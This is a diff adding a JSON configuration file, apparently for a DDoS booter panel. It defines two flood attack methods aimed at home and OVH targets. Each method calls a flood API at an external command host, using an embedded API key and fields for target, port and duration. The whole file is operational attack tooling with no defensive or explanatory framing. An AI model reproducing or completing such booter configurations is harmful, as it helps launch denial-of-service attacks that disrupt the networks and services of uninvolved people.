@@ -1,0 +1,40 @@
+{
+     "Attacks" : [
+
+          {
+               "Name" : "home-harmony",
+               "AttackName" : "HARMONY-HOME",
+               "Description" : "Standard Home Flood",
+               "API" : "https://harmonycnc.net/api?key=HarmonyCNC2392&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-harmony",
+               "AttackName" : "HARMONY-OVH",
+               "Description" : "Standard Home Flood",
+               "API" : "https://harmonycnc.net/api?key=HarmonyCNC2392&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+               
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 300
+               },
+
+
+               "DefaultPort" : "22",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          }
+     ]
+}
